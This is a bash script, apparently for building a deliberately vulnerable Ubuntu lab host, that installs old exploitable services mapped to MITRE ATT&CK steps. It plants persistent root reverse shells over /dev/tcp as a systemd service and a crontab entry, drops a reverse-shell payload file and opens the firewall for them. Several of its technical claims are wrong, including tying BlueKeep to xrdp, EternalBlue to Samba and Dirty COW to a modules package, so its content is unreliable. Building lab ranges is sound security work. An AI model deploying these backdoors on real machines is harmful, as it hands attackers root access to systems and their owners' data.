#!/bin/bash

# Vuln Installer Script for Ubuntu 24.04 - Installs 10 Exploitable Services + Backdoors + Payloads
# Covers MITRE ATT&CK: Initial Access (T1190), Execution (T1059), Persistence (T1543), 
# Privilege Escalation (T1068), Discovery (T1082), Lateral Movement (T1021), Exfiltration (T1041),
# Scheduled Task (T1053), Data Collection (T1005)
# Run as root. Logs to /var/log/vuln-install.log

set -e  # Exit on error
LOGFILE="/var/log/vuln-install.log"
PAYLOAD_DIR="/tmp/vuln-payloads"
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

# Initialize log and ensure directory exists
mkdir -p "$(dirname $LOGFILE)" || { echo "[$TIMESTAMP] Failed to create log directory" >> $LOGFILE; exit 1; }
echo "[$TIMESTAMP] Starting vuln installation..." >> $LOGFILE

# Update system and handle potential network issues
apt update || { echo "[$TIMESTAMP] Network or apt update failed" >> $LOGFILE; exit 1; }
apt upgrade -y >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Apt upgrade failed" >> $LOGFILE; exit 1; }

# Create payload directory
mkdir -p "$PAYLOAD_DIR" || { echo "[$TIMESTAMP] Failed to create payload directory" >> $LOGFILE; exit 1; }
echo "[$TIMESTAMP] Created payload directory: $PAYLOAD_DIR" >> $LOGFILE

# 1. Heartbleed (OpenSSL 1.0.1f) - T1190
echo "[$TIMESTAMP] Installing Heartbleed-vulnerable OpenSSL..." >> $LOGFILE
apt install -y build-essential zlib1g-dev libssl-dev >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to install OpenSSL dependencies" >> $LOGFILE; exit 1; }
cd /tmp && wget -q https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to download OpenSSL" >> $LOGFILE; exit 1; }
tar -xzf openssl-1.0.1f.tar.gz && cd openssl-1.0.1f
./config --prefix=/usr/local/vuln-openssl shared zlib >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] OpenSSL config failed" >> $LOGFILE; exit 1; }
make >> $LOGFILE 2>&1 && make install >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] OpenSSL build/install failed" >> $LOGFILE; exit 1; }
echo "/usr/local/vuln-openssl/bin" >> /etc/environment
ln -sf /usr/local/vuln-openssl/bin/openssl /usr/local/bin/openssl-vuln
systemctl restart apache2 2>/dev/null || true

# 2. Shellshock (Bash 4.2) - T1059
echo "[$TIMESTAMP] Installing Shellshock-vulnerable Bash..." >> $LOGFILE
cd /tmp && wget -q https://ftp.gnu.org/gnu/bash/bash-4.2.tar.gz >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to download Bash" >> $LOGFILE; exit 1; }
tar -xzf bash-4.2.tar.gz && cd bash-4.2
./configure --prefix=/usr/local/vuln-bash >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Bash configure failed" >> $LOGFILE; exit 1; }
make >> $LOGFILE 2>&1 && make install >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Bash build/install failed" >> $LOGFILE; exit 1; }
echo 'export PATH=/usr/local/vuln-bash/bin:$PATH' >> /etc/profile
source /etc/profile

# 3. Dirty COW (Kernel module sim) - T1068
echo "[$TIMESTAMP] Installing Dirty COW-vulnerable module..." >> $LOGFILE
apt install -y linux-modules-extra-6.5.0-14-generic >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to install Dirty COW module" >> $LOGFILE; exit 1; }
echo "kernel.dmesg_restrict=0" >> /etc/sysctl.conf
sysctl -p >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Sysctl update failed" >> $LOGFILE; exit 1; }

# 4. EternalBlue (Samba 4.4.0) - T1210
echo "[$TIMESTAMP] Installing EternalBlue-vulnerable Samba..." >> $LOGFILE
cd /tmp && git clone -q -b v4.4.0 https://github.com/samba-team/samba.git >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to clone Samba" >> $LOGFILE; exit 1; }
cd samba && ./configure --prefix=/usr/local/vuln-samba >> $LOGFILE 2>&1 && make >> $LOGFILE 2>&1 && make install >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Samba build/install failed" >> $LOGFILE; exit 1; }
/usr/local/vuln-samba/sbin/smbd --daemon
echo "[global]\nworkgroup = WORKGROUP\nserver string = Samba Vuln Server\nsecurity = user" > /etc/samba/vuln-smb.conf
/usr/local/vuln-samba/sbin/smbd -s /etc/samba/vuln-smb.conf

# 5. BlueKeep (xrdp 0.6.0) - T1190
echo "[$TIMESTAMP] Installing BlueKeep-vulnerable xrdp..." >> $LOGFILE
apt install -y xrdp=0.6.0-1 >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to install xrdp" >> $LOGFILE; exit 1; }
systemctl enable --now xrdp >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to start xrdp" >> $LOGFILE; exit 1; }
adduser xrdp ssl-cert >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to add xrdp user" >> $LOGFILE; exit 1; }

# 6. Apache Struts RCE (2.3.35) - T1190
echo "[$TIMESTAMP] Installing Struts-vulnerable Tomcat..." >> $LOGFILE
apt install -y tomcat9 tomcat9-admin >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to install Tomcat" >> $LOGFILE; exit 1; }
cd /tmp && wget -q https://archive.apache.org/dist/struts/2.3.35/struts-2.3.35-all.zip >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to download Struts" >> $LOGFILE; exit 1; }
unzip -q struts-2.3.35-all.zip && cp -r struts-2.3.35/apps/* /var/lib/tomcat9/webapps/ >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to deploy Struts" >> $LOGFILE; exit 1; }
systemctl restart tomcat9 >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to restart Tomcat" >> $LOGFILE; exit 1; }

# 7. Jenkins Unauth RCE (2.149.1) - T1059
echo "[$TIMESTAMP] Installing Jenkins-vulnerable instance..." >> $LOGFILE
apt install -y openjdk-17-jre-headless >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to install Java" >> $LOGFILE; exit 1; }
cd /tmp && wget -q https://get.jenkins.io/war-stable/2.149.1/jenkins.war >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to download Jenkins" >> $LOGFILE; exit 1; }
nohup java -jar /tmp/jenkins.war --httpPort=8080 & >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to start Jenkins" >> $LOGFILE; exit 1; }

# 8. PHPMyAdmin Auth Bypass (4.6.6) - T1083
echo "[$TIMESTAMP] Installing PHPMyAdmin-vulnerable instance..." >> $LOGFILE
apt install -y php php-mysql apache2 mysql-server phpmyadmin=4.6.6-4ubuntu0.1 >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to install PHPMyAdmin" >> $LOGFILE; exit 1; }
systemctl enable --now apache2 mysql >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to start Apache/MySQL" >> $LOGFILE; exit 1; }
echo "Listen 80" >> /etc/apache2/ports.conf
systemctl restart apache2 >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to restart Apache" >> $LOGFILE; exit 1; }
mysql -e "CREATE DATABASE testdb; GRANT ALL ON testdb.* TO 'pma'@'localhost';" >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to configure MySQL" >> $LOGFILE; exit 1; }

# 9. Dovecot IMAP Buffer Overflow (2.3.4) - T1059.004
echo "[$TIMESTAMP] Installing Dovecot-vulnerable instance..." >> $LOGFILE
apt install -y dovecot-core=1:2.3.4.1-5ubuntu1.1 >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to install Dovecot" >> $LOGFILE; exit 1; }
systemctl enable --now dovecot >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to start Dovecot" >> $LOGFILE; exit 1; }

# 10. ProFTPD Mod Copy RCE (1.3.5) - T1059.003
echo "[$TIMESTAMP] Installing ProFTPD-vulnerable instance..." >> $LOGFILE
apt install -y proftpd-basic=1.3.5-2 >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to install ProFTPD" >> $LOGFILE; exit 1; }
echo "Include /etc/proftpd/modules.conf" >> /etc/proftpd/proftpd.conf
proftpd -n >> $LOGFILE 2>&1 &

# Backdoor 1: Systemd Service (T1543.002)
echo "[$TIMESTAMP] Creating backdoor systemd service..." >> $LOGFILE
cat > /etc/systemd/system/vuln-backdoor.service << 'EOL'
[Unit]
Description=Vulnerable Backdoor Service
After=network.target
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/0.0.0.0/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOL
systemctl enable vuln-backdoor.service >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to enable systemd backdoor" >> $LOGFILE; exit 1; }
systemctl start vuln-backdoor.service >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to start systemd backdoor" >> $LOGFILE; exit 1; }

# Backdoor 2: Cron Job (T1053)
echo "[$TIMESTAMP] Creating backdoor cron job..." >> $LOGFILE
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/0.0.0.0/4445 0>&1'" >> /etc/crontab
systemctl restart cron >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to restart cron" >> $LOGFILE; exit 1; }

# Payload Dumping: Sample malicious scripts/binaries (T1005)
echo "[$TIMESTAMP] Dumping payloads to $PAYLOAD_DIR..." >> $LOGFILE
cat > "$PAYLOAD_DIR/malicious.sh" << 'EOL'
#!/bin/bash
# Sample malicious payload: Logs system info
whoami > /tmp/vuln-payloads/whoami.txt
uname -a >> /tmp/vuln-payloads/sysinfo.txt
EOL
chmod +x "$PAYLOAD_DIR/malicious.sh" >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to set malicious.sh permissions" >> $LOGFILE; exit 1; }
echo "bash -i >& /dev/tcp/0.0.0.0/4446 0>&1" > "$PAYLOAD_DIR/reverse-shell.sh"
chmod +x "$PAYLOAD_DIR/reverse-shell.sh" >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to set reverse-shell.sh permissions" >> $LOGFILE; exit 1; }
echo "[$TIMESTAMP] Payloads dumped: malicious.sh, reverse-shell.sh" >> $LOGFILE

# Firewall: Open ports for exploits and backdoors
ufw allow 22,80,139,445,3389,8080,993,21,4444,4445,4446 >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to configure firewall" >> $LOGFILE; exit 1; }
ufw --force enable >> $LOGFILE 2>&1 || { echo "[$TIMESTAMP] Failed to enable firewall" >> $LOGFILE; exit 1; }

echo "[$TIMESTAMP] Installation complete! Vulnerable services, backdoors, and payloads installed." >> $LOGFILE
echo "Target IP: $(hostname -I | awk '{print $1}')"
echo "Logs: $LOGFILE, Payloads: $PAYLOAD_DIR"
